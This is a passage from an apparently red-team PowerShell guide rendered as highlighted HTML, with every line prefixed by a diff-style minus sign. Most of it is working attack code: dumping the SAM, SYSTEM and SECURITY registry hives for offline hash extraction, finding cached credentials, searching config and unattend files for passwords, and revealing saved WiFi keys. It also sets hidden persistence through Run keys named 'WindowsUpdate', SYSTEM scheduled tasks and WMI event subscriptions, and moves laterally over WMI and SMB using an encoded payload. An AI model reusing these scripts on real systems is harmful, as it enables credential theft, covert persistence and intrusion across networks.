-    </span><span class="nv">$timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Date</span><span class="w"> </span><span class="nt">-Format</span><span class="w"> </span><span class="s2">"yyyyMMdd_HHmmss"</span><span class="w">
-    </span><span class="nv">$outDir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">TEMP</span><span class="s2">\reg_</span><span class="nv">$timestamp</span><span class="s2">"</span><span class="w">
-    </span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-ItemType</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$outDir</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
-
-    </span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SAM</span><span class="w"> </span><span class="s2">"</span><span class="nv">$outDir</span><span class="s2">\SAM"</span><span class="w"> </span><span class="nx">/y</span><span class="w">
-    </span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SYSTEM</span><span class="w"> </span><span class="s2">"</span><span class="nv">$outDir</span><span class="s2">\SYSTEM"</span><span class="w"> </span><span class="nx">/y</span><span class="w">
-    </span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SECURITY</span><span class="w"> </span><span class="s2">"</span><span class="nv">$outDir</span><span class="s2">\SECURITY"</span><span class="w"> </span><span class="nx">/y</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Registry hives saved to: </span><span class="nv">$outDir</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[*] Extract with: secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL"</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="c"># Method 3: Extract cached credentials from registry</span><span class="w">
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Get-CachedCreds</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="nv">$nlKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"HKLM:\SECURITY\Cache"</span><span class="w">
-    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$nlKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Cached credentials exist (DCC2 hashes)"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[*] Extract with: secretsdump.py -security SECURITY -system SYSTEM LOCAL"</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="c"># Method 4: Search for credential files</span><span class="w">
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Find-CredentialFiles</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] Searching for credential files..."</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-
-    </span><span class="nv">$patterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
-        </span><span class="s2">"*.config"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"web.config"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"*.xml"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"unattend.xml"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"sysprep.xml"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="nv">$searchPaths</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
-        </span><span class="s2">"C:\inetpub"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"C:\Windows\Panther"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"C:\Windows\System32\sysprep"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$path</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$searchPaths</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$pattern</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$patterns</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-            </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$path</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="nv">$pattern</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w">
-                </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
-                    </span><span class="nv">$content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
-                    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$content</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'password|credential|connectionstring'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-                        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[!] Potential creds: </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
-                    </span><span class="p">}</span><span class="w">
-                </span><span class="p">}</span><span class="w">
-        </span><span class="p">}</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<h3 id="wifi-password-extraction">WiFi Password Extraction</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># wifi_creds.ps1 - Extract saved WiFi passwords</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Get-WifiPasswords</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="nv">$profiles</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netsh</span><span class="w"> </span><span class="nx">wlan</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">profiles</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="s2">"All User Profile"</span><span class="w"> </span><span class="o">|</span><span class="w">
-        </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="s2">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="nf">Trim</span><span class="p">()</span><span class="w"> </span><span class="p">}</span><span class="w">
-
-    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$profile</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$profiles</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="nv">$details</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netsh</span><span class="w"> </span><span class="nx">wlan</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">profile</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"</span><span class="nv">$profile</span><span class="s2">"</span><span class="w"> </span><span class="n">key</span><span class="o">=</span><span class="n">clear</span><span class="w">
-
-        </span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nv">$details</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="s2">"Key Content"</span><span class="p">)</span><span class="w"> </span><span class="o">-replace</span><span class="w"> </span><span class="s2">".*:\s*"</span><span class="p">,</span><span class="w"> </span><span class="s2">""</span><span class="w">
-
-        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-            </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"SSID: </span><span class="nv">$profile</span><span class="s2">"</span><span class="w">
-            </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Password: </span><span class="nv">$password</span><span class="s2">"</span><span class="w">
-            </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">""</span><span class="w">
-        </span><span class="p">}</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="n">Get-WifiPasswords</span><span class="w">
-</span></code></pre></div></div>
-
-<h2 id="persistence-mechanisms">Persistence Mechanisms</h2>
-
-<h3 id="registry-run-keys">Registry Run Keys</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># persist_registry.ps1 - Registry-based persistence</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Set-RegistryPersistence</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">(</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$PayloadPath</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"WindowsUpdate"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="c"># User-level (no admin needed)</span><span class="w">
-    </span><span class="nv">$userKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="w">
-    </span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$userKey</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$Name</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$PayloadPath</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] User persistence set: </span><span class="nv">$userKey</span><span class="s2">\</span><span class="nv">$Name</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-
-    </span><span class="c"># Admin-level (if elevated)</span><span class="w">
-    </span><span class="nv">$isAdmin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">Security.Principal.WindowsPrincipal</span><span class="p">][</span><span class="n">Security.Principal.WindowsIdentity</span><span class="p">]::</span><span class="n">GetCurrent</span><span class="p">())</span><span class="o">.</span><span class="nf">IsInRole</span><span class="p">([</span><span class="n">Security.Principal.WindowsBuiltInRole</span><span class="p">]::</span><span class="nx">Administrator</span><span class="p">)</span><span class="w">
-
-    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$isAdmin</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="nv">$machineKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="w">
-        </span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$machineKey</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$Name</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$PayloadPath</span><span class="w">
-        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Machine persistence set: </span><span class="nv">$machineKey</span><span class="s2">\</span><span class="nv">$Name</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Remove-RegistryPersistence</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">([</span><span class="n">string</span><span class="p">]</span><span class="nv">$Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"WindowsUpdate"</span><span class="p">)</span><span class="w">
-
-    </span><span class="n">Remove-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$Name</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
-    </span><span class="n">Remove-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$Name</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Persistence removed"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<h3 id="scheduled-task-persistence">Scheduled Task Persistence</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># persist_schtask.ps1 - Scheduled task persistence</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Set-TaskPersistence</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">(</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$PayloadPath</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$TaskName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SystemHealthCheck"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="nv">$action</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="nv">$PayloadPath</span><span class="w">
-    </span><span class="nv">$trigger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskTrigger</span><span class="w"> </span><span class="nt">-AtLogOn</span><span class="w">
-    </span><span class="nv">$settings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskSettingsSet</span><span class="w"> </span><span class="nt">-Hidden</span><span class="w">
-
-    </span><span class="n">Register-ScheduledTask</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="nv">$TaskName</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nv">$action</span><span class="w"> </span><span class="nt">-Trigger</span><span class="w"> </span><span class="nv">$trigger</span><span class="w"> </span><span class="nt">-Settings</span><span class="w"> </span><span class="nv">$settings</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Scheduled task created: </span><span class="nv">$TaskName</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="c"># Alternative: schtasks.exe method (works without PS modules)</span><span class="w">
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Set-TaskPersistenceCMD</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">(</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$PayloadPath</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$TaskName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SystemHealthCheck"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">/tn</span><span class="w"> </span><span class="nv">$TaskName</span><span class="w"> </span><span class="nx">/tr</span><span class="w"> </span><span class="nv">$PayloadPath</span><span class="w"> </span><span class="nx">/sc</span><span class="w"> </span><span class="nx">onlogon</span><span class="w"> </span><span class="nx">/ru</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="nx">/f</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Scheduled task created via schtasks.exe"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<h3 id="wmi-event-subscription">WMI Event Subscription</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># persist_wmi.ps1 - WMI event subscription persistence (stealthier)</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Set-WMIPersistence</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">(</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$PayloadPath</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SystemCoreMonitor"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="c"># Event filter - triggers on system startup</span><span class="w">
-    </span><span class="nv">$filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Set-WmiInstance</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="nx">root\subscription</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">__EventFilter</span><span class="w"> </span><span class="nt">-Arguments</span><span class="w"> </span><span class="p">@{</span><span class="w">
-        </span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">${Name}</span><span class="s2">_Filter"</span><span class="w">
-        </span><span class="nx">EventNamespace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'root\cimv2'</span><span class="w">
-        </span><span class="nx">QueryLanguage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'WQL'</span><span class="w">
-        </span><span class="nx">Query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="c"># Event consumer - runs payload</span><span class="w">
-    </span><span class="nv">$consumer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Set-WmiInstance</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="nx">root\subscription</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">CommandLineEventConsumer</span><span class="w"> </span><span class="nt">-Arguments</span><span class="w"> </span><span class="p">@{</span><span class="w">
-        </span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">${Name}</span><span class="s2">_Consumer"</span><span class="w">
-        </span><span class="nx">CommandLineTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$PayloadPath</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="c"># Binding</span><span class="w">
-    </span><span class="n">Set-WmiInstance</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="nx">root\subscription</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">__FilterToConsumerBinding</span><span class="w"> </span><span class="nt">-Arguments</span><span class="w"> </span><span class="p">@{</span><span class="w">
-        </span><span class="nx">Filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$filter</span><span class="w">
-        </span><span class="nx">Consumer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$consumer</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] WMI persistence set: </span><span class="nv">$Name</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Remove-WMIPersistence</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">([</span><span class="n">string</span><span class="p">]</span><span class="nv">$Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SystemCoreMonitor"</span><span class="p">)</span><span class="w">
-
-    </span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="nx">root\subscription</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">__EventFilter</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"Name='</span><span class="nv">${Name}</span><span class="s2">_Filter'"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Remove-WmiObject</span><span class="w">
-    </span><span class="nx">Get-WmiObject</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="nx">root\subscription</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">CommandLineEventConsumer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"Name='</span><span class="nv">${Name}</span><span class="s2">_Consumer'"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Remove-WmiObject</span><span class="w">
-    </span><span class="nx">Get-WmiObject</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="nx">root\subscription</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">__FilterToConsumerBinding</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Filter</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*</span><span class="nv">${Name}</span><span class="s2">*"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Remove-WmiObject</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] WMI persistence removed"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></code></pre></div></div>
-
-<h2 id="lateral-movement">Lateral Movement</h2>
-
-<h3 id="psexec-alternative-wmi-based">PSExec Alternative (WMI-based)</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># lateral_wmi.ps1 - WMI-based lateral movement</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Invoke-WMIExec</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">(</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$Target</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$Command</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">System.Management.Automation.PSCredential</span><span class="p">]</span><span class="nv">$Credential</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="nv">$processClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">wmiclass</span><span class="p">]</span><span class="s2">"\\</span><span class="nv">$Target</span><span class="s2">\root\cimv2:Win32_Process"</span><span class="w">
-
-    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Credential</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="nv">$options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.ConnectionOptions</span><span class="w">
-        </span><span class="nv">$options</span><span class="o">.</span><span class="nf">Username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Credential</span><span class="o">.</span><span class="nf">UserName</span><span class="w">
-        </span><span class="nv">$options</span><span class="o">.</span><span class="nf">Password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Credential</span><span class="o">.</span><span class="nf">GetNetworkCredential</span><span class="p">()</span><span class="o">.</span><span class="nf">Password</span><span class="w">
-
-        </span><span class="nv">$scope</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.ManagementScope</span><span class="p">(</span><span class="s2">"\\</span><span class="nv">$Target</span><span class="s2">\root\cimv2"</span><span class="p">,</span><span class="w"> </span><span class="nv">$options</span><span class="p">)</span><span class="w">
-        </span><span class="nv">$scope</span><span class="o">.</span><span class="nf">Connect</span><span class="p">()</span><span class="w">
-
-        </span><span class="nv">$processClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.ManagementClass</span><span class="p">(</span><span class="nv">$scope</span><span class="p">,</span><span class="w"> </span><span class="s2">"Win32_Process"</span><span class="p">,</span><span class="w"> </span><span class="bp">$null</span><span class="p">)</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$processClass</span><span class="o">.</span><span class="nf">Create</span><span class="p">(</span><span class="nv">$Command</span><span class="p">)</span><span class="w">
-
-    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$result</span><span class="o">.</span><span class="nf">ReturnValue</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] Command executed on </span><span class="nv">$Target</span><span class="s2"> (PID: </span><span class="si">$(</span><span class="nv">$result</span><span class="o">.</span><span class="nf">ProcessId</span><span class="si">)</span><span class="s2">)"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-    </span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[-] Failed with code: </span><span class="si">$(</span><span class="nv">$result</span><span class="o">.</span><span class="nf">ReturnValue</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Red</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="c"># Usage:</span><span class="w">
-</span><span class="c"># $cred = Get-Credential</span><span class="w">
-</span><span class="c"># Invoke-WMIExec -Target "DC01" -Command "powershell -enc BASE64PAYLOAD" -Credential $cred</span><span class="w">
-</span></code></pre></div></div>
-
-<h3 id="smb-file-copy--execute">SMB File Copy &amp; Execute</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># lateral_smb.ps1 - Copy and execute via SMB</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Invoke-SMBExec</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="kr">param</span><span class="p">(</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$Target</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$LocalPayload</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">string</span><span class="p">]</span><span class="nv">$RemotePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C</span><span class="err">$</span><span class="s2">\Windows\Temp"</span><span class="p">,</span><span class="w">
-        </span><span class="p">[</span><span class="n">System.Management.Automation.PSCredential</span><span class="p">]</span><span class="nv">$Credential</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-
-    </span><span class="nv">$payloadName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Split-Path</span><span class="w"> </span><span class="nv">$LocalPayload</span><span class="w"> </span><span class="nt">-Leaf</span><span class="w">
